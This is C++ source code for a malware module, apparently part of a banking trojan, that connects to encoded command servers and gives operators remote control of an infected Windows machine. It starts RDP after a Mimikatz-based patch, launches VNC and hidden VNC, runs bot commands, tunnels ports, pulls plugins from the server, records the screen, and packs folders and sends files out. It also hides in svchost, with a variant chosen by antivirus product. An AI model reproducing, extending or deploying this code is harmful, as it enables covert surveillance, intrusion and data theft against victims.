#include "main.h"
#include "VideoServer.h"
#include "core\injects.h"
#include "core\PipeSocket.h"
#include "WndRec\manager.h"
#include "WndRec\socks.h"
#include "WndRec\video.h"
#include "WndRec\cmdexec.h"
#include "WndRec\file.h"
#include "manager.h"
#include "core\cab.h"
#include "task.h"
#include "other.h"

namespace VideoServer
{

bool StartRDP();
//если tag указан, то он удаляется внутри функции
bool StartVNC( AddressIpPort& ipp, bool hvnc, void* tag = 0, int c_tag = 0 );
bool StartServerTunnel( int port, const char* pipeName );
static bool LoadPluginRequest( const char* namePlugin, Pipe::Msg* msgIn ); //отправляет запрос на закачку плагина
static bool LoadPluginLoaded( uint id, void* data, int c_data ); //полученный плагин отправляет заказчику
static void HandlerSendFolderPack( Pipe::AutoMsg msg, DWORD tag );
static void HandlerCreateLog( Pipe::AutoMsg msg, DWORD tag );

WndRec::ServerData* server = 0;
bool isMimikatzPathRDP = false; //true если патчинг уже был выполнен

struct WaitPlugin
{
	uint id; //ид по которому прийдет плагин, если = 0, то ячейка свободна
	uint time; //время когда был запрошен плагин, если плагин долго не приходит, то считаем эту ячейку свободной
	char pipe[32]; //имя пайп канала, куда отсылать плагин
	Pipe::typeReceiverPipeAnswer func; //функция которой передается управления после загрузки плагина
	DWORD tag;
};

const int MaxWaitPlugins = 4;
WaitPlugin waitPlugins[MaxWaitPlugins];
CRITICAL_SECTION lockPlugins;

int Init()
{
	server = 0;
	isMimikatzPathRDP = false;
	Mem::Set( waitPlugins, sizeof(waitPlugins), 0 );
	CriticalSection::Init(lockPlugins);
	return true;
}

void Release()
{
}

static DWORD WINAPI CallbackCmd( WndRec::ServerData* server, DWORD cmd, uint id, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData )
{
	DWORD res = 0;
	switch( cmd )
	{
		case 21: //RDP
			outData[0] = StartRDP();
			res = 1;
			break;
		case 22: //VNC
		case 28:
		case 41: //HVNC
			if( lenInData >= 2 )
			{
				AddressIpPort ipp;
				void* tag = 0;
				int c_tag = 0;
				bool startPortForward = true;
				if( lenInData == 2 )
				{
					ipp.ip[0] = 0;
					ipp.port = *((ushort*)inData);
					if( ipp.port == 0 ) //внц должна подключиться к серверу, для этого дополнительно передаем какие данные нужно отослать серверу
					{
						Str::Copy( ipp.ip, server->ip[server->currIP].ip );
						ipp.port = server->ip[server->currIP].port;
						tag = WndRec::CreateRawPacket( 3, WndRec::ID_BC_PORT, Config::UID, Str::Len(Config::UID), c_tag );
						*((byte*)tag) = 0xff; //идентификатор для внц длл
						*((ushort*)((byte*)tag + 1)) = c_tag - 3; //размер отправляемых данных серверу
						startPortForward = false; //не нужно запускать систему проброса портов PortForward 
					}
				}
				else
					ipp.Parse((char*)inData);
				if( StartVNC( ipp, (cmd == 41 ? true : false), tag, c_tag ) )
				{
					outData[0] = startPortForward ? 2 : 1;
				}
				else
					outData[0] = 0;
			}
			else
				outData[0] = 0;
			res = 1;
			break;
		case 27: //команда боту
			if( lenInData > 2 )
			{
				int len = (inData[1] << 8) | inData[0];
				ManagerServer::CmdExec( inData + 2, len );
			}
			break;
		case WndRec::ID_CONNECTED:
			PipeClient::Send( Config::nameManager, ManagerServer::CmdVideoServerConnected, inData, lenInData );
			break;
		case WndRec::ID_PLUGIN:
			LoadPluginLoaded( id, inData, lenInData );
			break;
	}
	return res;
}

void Run( bool async )
{
	StringBuilderStack<MaxFlagsVideoServer> textFlags = DECODE_STRING(Config::FlagsVideoServer);
	int flags = 0;
	if( textFlags[1] == '1' ) flags |= 1; //запускать в спящем режиме
	//извлекаем время через которое переходит в режим спячки
	char textDowntime[8];
	Str::Copy( textDowntime, textFlags.c_str() + 2, 5 );
	int downtime = Str::ToInt(textDowntime);
	//извлекаем адреса серверов
#ifdef IP_SERVER_EXTERNAL_IP
	StringBuilderStack<MaxSizeIpVideoServer> ipServers = Config::ExternalIP;
	flags |= 8; //завершать работу при долгом отсутствии связи
#else
	StringBuilderStack<MaxSizeIpVideoServer> ipServers = DECODE_STRING(Config::VideoServers);
#endif
	StringArray servers = ipServers.Split('|');
	server = 0;
	for( int i = 0; i < servers.Count(); i++ )
	{
		char* ip = servers[i]->c_str();
		int p = Str::IndexOf( ip, ':' ); //IP:Port
		if( p > 0 )
		{
			ip[p] = 0;
			int port = Str::ToInt( ip + p + 1 );
			if( !server )
			{
				DbgMsg( "Запуск видео сервера, ip = %s:%d, downtime = %d", ip, port, downtime );
				server = WndRec::Init( flags, ip, port, downtime );
			}
			else
			{
				DbgMsg( "Добавляем дублирующий видео сервер, ip = %s:%d", ip, port );
				WndRec::AddIPServer( server, ip, port );
			}
		}
	}
	if( server )
	{
		WndRec::RunCmdExec( server, CallbackCmd );
		VideoPipeServer* pipeServer = new VideoPipeServer();
		if( pipeServer ) 
		{
			pipeServer->Reg();
			if( async )
				pipeServer->StartAsync();
			else
				pipeServer->Start();
		}
	}
}

DWORD WINAPI VideoServerProcess( void* )
{
	if( !InitBot() ) return 0;
	if( !Socket::Init() ) return 0;
	Rand::Init();
	if( !Init() ) return 0;
	if( !Pipe::InitServerPipeResponse() ) return 0;
	Run(false);
	Release();
	Socket::Release();
	ReleaseBot();
	API(KERNEL32, ExitProcess)(0);
	return 0;
}

bool VerifyConnect()
{
	StringBuilderStack<MaxSizeIpVideoServer> ipServers = DECODE_STRING(Config::VideoServers);
	StringArray servers = ipServers.Split('|');
	bool ret = false;
	if( servers.Count() )
	{
		for( int i = 0; i < servers.Count(); i++ )
		{
			AddressIpPort addr;
			if( addr.Parse( servers[i]->c_str() ) )
			{
				int sc = Socket::ConnectIP( addr.ip, addr.port );
				if( sc > 0 )
				{
					Socket::Close(sc);
					ret = true;
					break;
				}
			}
		}
	}
	else
		ret = true;
	return ret;
}

bool GetHosts( StringBuilder& hosts )
{
	hosts = DECODE_STRING(Config::VideoServers);
	return true;
}

bool RunInSvchost( const char* nameUser )
{
	if( Config::AV == AV_TrandMicro )
		return JmpToSvchost1( VideoServerProcess, Config::exeDonor, nameUser ) != 0;
	else
		return JmpToSvchost2( VideoServerProcess, Config::exeDonor, nameUser ) != 0;
}

void Start()
{
	StringBuilderStack<MaxFlagsVideoServer> textFlags = DECODE_STRING(Config::FlagsVideoServer);
	DbgMsg( "Настройки бк сервера %s", textFlags.c_str() );
	if( textFlags[0] == '1' ) //запускать в отдельном процессе
	{
		DbgMsg("Запуск работы с бк сервером в отдельном процессе" );
		RunInSvchost(MAIN_USER);
	}
	else
	{
		Config::state |= SERVER_NOT_PROCESS;
		if( !Init() ) return;
		Run();
	}
}

static void AnswerPatchRDP( Pipe::AutoMsg msg, DWORD )
{
	bool res = *((bool*)msg->data);
	if( res )
	{
		DbgMsg( "Patch RDP выполнен успешно" );
		isMimikatzPathRDP = true;
	}
	else
		DbgMsg( "Patch RDP выполнить не удалось" );
	API(KERNEL32, SetEvent)( (HANDLE)msg->tag );
}

bool StartRDP()
{
#ifdef ON_MIMIKATZ
	if( isMimikatzPathRDP ) return true;
	HANDLE eventWait = API(KERNEL32, CreateEventA)( nullptr, TRUE, FALSE, nullptr );
	ManagerServer::MimikatzPathRDP( AnswerPatchRDP, (DWORD)eventWait );
	if( API(KERNEL32, WaitForSingleObject)( eventWait, 5000 ) == WAIT_OBJECT_0 ) 
		return true;
#endif
	return false;
}

bool StartVNC( AddressIpPort& ipp, bool hvnc, void* tag, int c_tag )
{
	return VNC::StartDefault( ipp, hvnc, tag, c_tag );
}

bool StartServerTunnel( int port, const char* pipeName )
{
	if( VideoServer::server )
	{
		if( port == -1 )
		{
			DbgMsg( "Run pipe socket server %s", pipeName );
			PipeSocketServer* tunnel = new PipeSocketServer( pipeName, WndRec::GetIPServer(VideoServer::server), WndRec::GetPortServer(VideoServer::server) );
			return tunnel->StartAsync(false);
		}
		else
		{
			VideoServerTunnel* tunnel = new VideoServerTunnel(port);
			return tunnel->StartAsync();
		}
	}
}

bool LoadPluginRequest( const char* namePlugin, Pipe::Msg* msgIn )
{
	int i = 0;
	uint time = API(KERNEL32, GetTickCount)();
	CriticalSection cs(lockPlugins);
	for( ; i < MaxWaitPlugins; i++ )
	{
		if( waitPlugins[i].id == 0 ) break;
		if( time - waitPlugins[i].time >= 3600 * 1000 ) break; //в течении часа не пришел запрошенный плагин
	}
	if( i < MaxWaitPlugins )
	{
		waitPlugins[i].id = WndRec::LoadPluginAsync( server, namePlugin );
		if( waitPlugins[i].id == 0 )
		{
			Pipe::SendAnswer( msgIn, VideoPipeServer::CmdLoadPlugin, 0, 0 );
			return false;
		}
		waitPlugins[i].time = time;
		Str::Copy( waitPlugins[i].pipe, sizeof(waitPlugins[i].pipe), msgIn->answer );
		waitPlugins[i].func = msgIn->func;
		waitPlugins[i].tag = msgIn->tag;
		DbgMsg( "Послан запрос на загрузку плагина %s с сервера (id=%d)", namePlugin, waitPlugins[i].id );
		return true;
	}
	return false;
}

bool LoadPluginLoaded( uint id, void* data, int c_data )
{
	DbgMsg( "Получен плагин с сервера (id=%d)", id );
	bool ret = false;
	CriticalSection cs(lockPlugins);
	for( int i = 0; i < MaxWaitPlugins; i++ )
	{
		if( waitPlugins[i].id == id )
		{
			int sz = *((int*)data); 
			void* body = 0;
			if( sz <= 0 || sz > c_data - sizeof(int) || data == 0 )
				sz = 0;
			else
			{
				body = Mem::Alloc(sz);
				Mem::Copy( body, (byte*)data + sizeof(int), sz );
			}
			ret = PipeClient::Send( waitPlugins[i].pipe, VideoPipeServer::CmdLoadPlugin, body, sz, 0, waitPlugins[i].func, waitPlugins[i].tag );
			Mem::Free(body);
			waitPlugins[i].id = 0;
			break;
		}
	}
	return ret;
}

void AddServers( const void* data, int sz_data )
{
	if( server == 0 ) return;
	StruAddServers* addServers = (StruAddServers*)data;
	int count = addServers->count;
	AddressIpPort* addr = (AddressIpPort*)((byte*)data + sizeof(StruAddServers));
	for( int i = 0; i < count;i++ )
		WndRec::AddIPServer( server, addr[i].ip, addr[i].port );
	if( addServers->force )
		WndRec::Reconnect( server, addr[0].ip, addr[0].port );
}

void HandlerSendFolderPack( Pipe::AutoMsg msg, DWORD tag )
{
	if( server == 0 ) return;
	VideoPipeServer::MsgSendFolderPack* m = (VideoPipeServer::MsgSendFolderPack*)msg->data;
	Cab cab;
	DbgMsg( "Упаковка папки %s, в %s", m->srcFolder, m->dstFolder );
	cab.AddFolder( m->dstFolder, m->srcFolder );
	cab.Close();
	DbgMsg( "Упаковка закончена, папка %s", m->srcFolder );
	WndRec::SendFile( server, m->typeName, m->fileName, _CS_("cab"), cab.GetData().Ptr(), cab.GetData().Len() );
	if( m->globalId >= 0 )
		ManagerServer::SetGlobalState( m->globalId, '1' );
}

void HandlerCreateLog( Pipe::AutoMsg msg, DWORD tag )
{
	if( server == 0 ) return;
	char* s = Str::Duplication( (char*)msg->data, msg->sz_data );
	uint id = WndRec::CreateStream( server, WndRec::STREAM_LOG, 0, s, 0, 10000 );
	Pipe::SendAnswer( msg, msg->cmd, &id, sizeof(id) );
	Str::Free(s);
}

void HandlerCreateStream( Pipe::AutoMsg msg, DWORD tag )
{
	if( server == 0 ) return;
	char* p = (char*)msg->data;
	int typeId = *(int*)p; p += sizeof(typeId);
	char* typeName = p; p += Str::Len(p) + 1;
	char* fileName = p; p += Str::Len(p) + 1;
	char* ext = p;
	DbgMsg( "Запрос на создание потока %d,%s,%s,%s", typeId, typeName, fileName, ext );
	uint id = WndRec::CreateStream( VideoServer::server, typeId, typeName, fileName, ext, 10000 );
	Pipe::SendAnswer( msg, msg->cmd, &id, sizeof(id) );
}

}

VideoPipeServer::VideoPipeServer()
{
}

VideoPipeServer::~VideoPipeServer()
{
}

int VideoPipeServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int ret = 0;
	switch( msgIn->cmd )
	{
		case CmdVideo:
			if( VideoServer::server ) 
			{
				MsgVideo* msg = (MsgVideo*)msgIn->data;
				if( msg->pid )
					WndRec::StartRecPid( VideoServer::server, Config::UID, msg->nameVideo, msg->pid, 0, 0 );
				else
					WndRec::StartRecHwnd( VideoServer::server, Config::UID, msg->nameVideo, HWND_DESKTOP, 0, WndRec::VIDEO_FULLSCREEN | WndRec::VIDEO_ALWAYS );
			}
			break;
		case CmdVideoOff:
			WndRec::StopRec();
			break;
		case CmdSendFile:
			SendFile( msgIn->data, msgIn->sz_data );
			break;
		case CmdTunnel:
			if( msgIn->sz_data >= sizeof(int) )
			{
				int port = *((int*)msgIn->data);
				char* pipeName = (char*)msgIn->data + sizeof(port);
				VideoServer::StartServerTunnel( port, pipeName );
			}
			break;
		case CmdAddServers:
			VideoServer::AddServers( msgIn->data, msgIn->sz_data );
			break;
		case CmdPackSendFolder:
			HandlerAsync( VideoServer::HandlerSendFolderPack, msgIn, msgIn->tag );
			break;
		case CmdCreateLog:
			HandlerAsync( VideoServer::HandlerCreateLog, msgIn, msgIn->tag );
			break;
		case CmdSendLog:
			if( VideoServer::server ) 
			{
				uint idStream = *((int*)msgIn->data);
				WndRec::WriteStream( VideoServer::server, idStream, (byte*)msgIn->data + sizeof(idStream), msgIn->sz_data - sizeof(idStream) );
			}
			break;
		case CmdSendStr:
			{
				WndRec::StrServer* s = (WndRec::StrServer*)msgIn->data;
				WndRec::SendStr( VideoServer::server, s->id, s->subId, s->s, s->c_s );
			}
			break;
		case CmdFirstFrame:
			if( VideoServer::server ) 
				WndRec::SendFirstFrame(VideoServer::server);
			break;
		case CmdLoadPlugin:
			VideoServer::LoadPluginRequest( (char*)msgIn->data, msgIn );
			break;
		case CmdCreateStream:
			HandlerAsync( VideoServer::HandlerCreateStream, msgIn, msgIn->tag );
			break;
		case CmdSendStreamData:
			if( VideoServer::server )
			{
				uint idStream = *((int*)msgIn->data);
				WndRec::WriteStream( VideoServer::server, idStream, (byte*)msgIn->data + sizeof(idStream), msgIn->sz_data - sizeof(idStream) );
			}
			break;
		case CmdCloseStream:
			if( VideoServer::server )
			{
				uint idStream = *((int*)msgIn->data);
				WndRec::CloseStream( VideoServer::server, idStream );
			}
			break;
	}
	return ret;
}

void VideoPipeServer::Disconnect()
{
	DbgMsg( "Видеосервер отключен" );
	if( VideoServer::server )
	{
		WndRec::Release(VideoServer::server);
		VideoServer::server = 0;
	}
}

void VideoPipeServer::SendFile( const void* data, int c_data )
{
	MsgSendFile* msg = (MsgSendFile*)data;
	WndRec::SendFile( VideoServer::server, msg->typeName, msg->fileName, msg->ext, msg->data, msg->c_data );
}

bool VideoPipeServer::Reg()
{
	return ManagerServer::RegVideoServer(this);
}

bool VideoPipeServer::SendStr( int id, int subId, const char* s, int c_s )
{
	int sz = sizeof(WndRec::StrServer) + c_s + 1;
	WndRec::StrServer* s2 = (WndRec::StrServer*)Mem::Alloc(sz);
	s2->id = id;
	s2->subId = subId;
	s2->c_s = c_s;
	Mem::Copy( s2->s, s, c_s );
	s2->s[c_s] = 0;
	bool res = PipeClient::Send( Config::nameManager, ManagerServer::CmdVideoServerSendStr, s2, sz );
	Mem::Free(s2);
	return res;
}

VideoServerTunnel::VideoServerTunnel( int portIn ) : ThroughTunnel( portIn, 0, 0 )
{
}

VideoServerTunnel::~VideoServerTunnel()
{
}

int VideoServerTunnel::Connected( int sc )
{
	if( VideoServer::server )
	{
		portOut = WndRec::GetPortServer(VideoServer::server);
		Str::Copy( ipOut, sizeof(ipOut), WndRec::GetIPServer(VideoServer::server) );
	}
	return 0;
}
